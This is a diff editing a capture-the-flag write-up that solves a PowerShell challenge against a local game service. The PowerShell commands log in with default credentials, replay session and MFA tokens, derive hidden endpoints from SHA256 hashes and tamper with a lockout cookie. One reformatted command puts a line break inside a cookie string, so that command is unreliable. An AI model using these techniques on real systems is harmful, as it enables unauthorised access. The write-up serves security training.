@@ -288,9 +288,10 @@ In this challenge, the player is required to run powershell commands to achieve 
    - `Invoke-WebRequest -Uri "http://127.0.0.1:1225"`
 5. It looks like defensive measures are in place, it is protected by basic authentication. Try authenticating with a standard admin username and password.
    - `$username = "admin"; $password = "admin"; $securePassword = ConvertTo-SecureString -String $password -AsPlainText; $credential = [PSCredential]::new($username, $securePassword) ; Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication`
+   - The username and password are both `admin`. For subsequent invocation of `Invoke-WebRequest`, the same variable `$credential` will be used.
 6. There are too many endpoints here. Use a loop to download the contents of each page. What page has 138 words? When you find it, communicate with the URL and print the contents to the terminal.
    - `$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication; foreach ($endpt in $response.Links) {$r = Invoke-WebRequest -Uri $endpt.href; $ct = $r.Content | Measure-Object -Word; if ($ct.Words -eq 138) {$endpt.href}  }`
-   - The above command iterates over all endpoints, queries them, compute the wordcount and output the URL when the word count is 138. The endpoint is `http://localhost:1225/endpoints/13`
+   - The above command iterates over all endpoints, queries them, compute the wordcount and output the URL when the word count is 138. The endpoint hosting a page with 138 words is `http://localhost:1225/endpoints/13`.
    - `$resp = Invoke-WebRequest -Uri "http://127.0.0.1:1225/endpoints/13"; $resp.Content`
    - This prints the content to the screen.
 7. There seems to be a csv file in the comments of that page. That could be valuable, read the contents of that csv-file!
@@ -301,7 +302,7 @@ In this challenge, the player is required to run powershell commands to achieve 
    - `$resp = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"}; $resp.Content`
 10. Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint!
 	- `$r = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"} ; $mfatokenvalue  = $r.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $allcookies = "token=5f8dd236f862f4507835b0e418907ffc" + ";mfa_token=" + $mfatokenvalue; $allcookies; $r2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$allcookies}; $r2.Content`
-	- The MFA token has an expiry time of 2 seconds and need to be supplied to the mfa_validate endpoint almost immediately after it is provided. There is a base64 encoded string in the output.
+	- The MFA token has an expiry time of 2 seconds and need to be supplied to the `mfa_validate` endpoint almost immediately after it is provided. There is a base64 encoded string in the output.
 11. That looks like base64! Decode it so we can get the final secret!
 	- `$r = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"} ; $mfatokenvalue  = $r.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $allcookies = "token=5f8dd236f862f4507835b0e418907ffc" + ";mfa_token=" + $mfatokenvalue; $allcookies; $r2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$allcookies}; $r2.Content -match "p>(?<encodedstring>.*)</p"; $encoded = $Matches.encodedstring; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded))`
 	- The decoded string reads "Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction".
@@ -312,7 +313,7 @@ There are two hints for **GOLD AWARD**:
 
 > I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.
 
-The **GOLD** challenge requires the player to set a certain cookie on one of the redacted endpoints. The second clue suggests that the redacted endpoint is obtained by hashing the token string using SHA256. Since one endpoint in unredacted, we can try this idea on the token (`5f8dd236f862f4507835b0e418907ffc`) from the Silver challenge on the Linux command line:
+The **GOLD** challenge requires the player to set a certain cookie on one of the redacted endpoints. The second clue suggests that the redacted endpoint is obtained by hashing the token string using SHA256. Since one endpoint is unredacted (the same one from the Silver challenge), we can try this idea on the token `5f8dd236f862f4507835b0e418907ffc` and see if it produces the endpoint. Hashing can be done on the Linux command line:
 
 ```
 $ echo "5f8dd236f862f4507835b0e418907ffc" | sha256sum
@@ -321,7 +322,7 @@ $ echo -n "5f8dd236f862f4507835b0e418907ffc" | sha256sum
 7fa1dad4145bc91c5354c72e540a2903e7933958914a15244e1d5af4ba005172  -
 ```
 
-The output above demonstrates that a newline character needs to be added to the token string before hashing (the `-n` switch omits the newline at the end). Also. Also, the hex representation of the SHA256 hash is converted to uppercase before it is used in the URL, i.e. "`421B4...A7E06C`" instead of "`4216b4...a7e06c`".
+The output above demonstrates that a newline character needs to be added to the token string before hashing (the `-n` switch omits the newline at the end). Also, the hex representation of the SHA256 hash is converted to uppercase before it is used in the URL, i.e. "`421B4...A7E06C`" instead of "`4216b4...a7e06c`".
 
 This is a part of the content of `token_overview.csv` file obtained earlier.
 
@@ -340,20 +341,38 @@ cb722d0b55805cd6feffc22a9f68177d,REDACTED
 # [*] Site functionality at minimum to keep weapons active 
 ```
 
-Taking the token "`67c7aef0d5d3e97ad2488babd2f4c749`" as an example, when it is SHA256-hashed with a newline, the string is "`BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60`". Hence the URL to access is `http://127.0.0.1:1225/tokens/BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60`.
+As an example when the token "`67c7aef0d5d3e97ad2488babd2f4c749`" is SHA256-hashed with a newline, the result is "`BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60`". Hence the URL to access is `http://127.0.0.1:1225/tokens/BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60`.
 
 When this endpoint is accessed using this command below, the response warns about a fakeout threshold and token validity timeout.
 
 ```
-$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; $endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; $URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; $cookiestring; $r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ; $r1.RawContent
+$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; 
+$endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; 
+$URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; 
+$cookiestring; 
+$r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ; 
+$r1.RawContent
 ```
 
 ![Canary Tripwire warning](files/Act2/powershell2.png)
 
-This command can be extended to access the `mfa_validate` endpoint and include the mfa_token cookie, as before. The response has a `Set-Cookie` header which contains the `attempts` and `Path` cookies. The value of the `attempts` cookie is set to `c25ha2VvaWwK01`, which is the string "snakeoil" in base64 encoded form.
+This command can be extended to access the `mfa_validate` endpoint and include the `mfa_token` cookie, as before. The response has a `Set-Cookie` header which contains the `attempts` and `Path` cookies. The value of the `attempts` cookie is set to `c25ha2VvaWwK01`, which is the string "snakeoil" in base64 encoded form.
 
 ```
-$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; $endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; $URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; $cookiestring; $r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ;  $URL2 = "http://127.0.0.1:1225/mfa_validate/" + $endpthash; $mfatokenvalue  = $r1.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $cookiestring2 = "token=" + $tokenstring + ";mfa_token=" + $mfatokenvalue; for ($j=0; $j -le 10; $j++) {$r2 = Invoke-WebRequest -Uri $URL2 -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring2}; $r2.RawContent }
+$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; 
+$endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; 
+$URL = "http://127.0.0.1:1225/tokens/" + $endpthash; 
+$cookiestring = "token=" + $tokenstring; 
+$cookiestring; 
+$r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ;
+$URL2 = "http://127.0.0.1:1225/mfa_validate/" + $endpthash; 
+$mfatokenvalue  = $r1.Links | Where-Object href -like "*.*" | select -last 1 -expand href; 
+$mfatokenvalue; 
+$cookiestring2 = "token=" + $tokenstring + ";
+mfa_token=" + $mfatokenvalue; 
+for ($j=0; $j -le 10; $j++) {
+$r2 = Invoke-WebRequest -Uri $URL2 -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring2}; 
+$r2.RawContent }
 ```
 
 ![Setting cookie attempts](files/Act2/powershell3.png)
@@ -361,12 +380,22 @@ $tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; $endpthash = "BAC2F3580B6491C
 The "Set-Cookie" header used to send cookies from the server to the client, with the expectation that the client can send it back in response later.  The previous command can be slightly modified to include the `attempts` and `Path` cookies.
 
 ```
-$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; $endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; $URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; $cookiestring; $r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ;  $URL2 = "http://127.0.0.1:1225/mfa_validate/" + $endpthash; $mfatokenvalue  = $r1.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $cookiestring2 = "token=" + $tokenstring + ";mfa_token=" + $mfatokenvalue + ";attempts=10; Path=/" ; for ($j=0; $j -le 10; $j++) {$r2 = Invoke-WebRequest -Uri $URL2 -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring2}; $r2.RawContent }
+$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; 
+$endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; 
+$URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; 
+$cookiestring; 
+$r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ;
+$URL2 = "http://127.0.0.1:1225/mfa_validate/" + $endpthash; $mfatokenvalue  = $r1.Links | Where-Object href -like "*.*" | select -last 1 -expand href; 
+$mfatokenvalue; 
+$cookiestring2 = "token=" + $tokenstring + ";mfa_token=" + $mfatokenvalue + ";attempts=10; Path=/" ; 
+for ($j=0; $j -le 10; $j++) {
+$r2 = Invoke-WebRequest -Uri $URL2 -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring2}; 
+$r2.RawContent }
 ```
 
 ![Setting cookie attempts](files/Act2/powershell4.png)
 
-With this, the value of the `attempts` cookie has changed and **GOLD** will be awarded.
+With this, the value of the `attempts` cookie has changed and it completes the **GOLD** challenge.
 
 
 ## Snowball Showdown
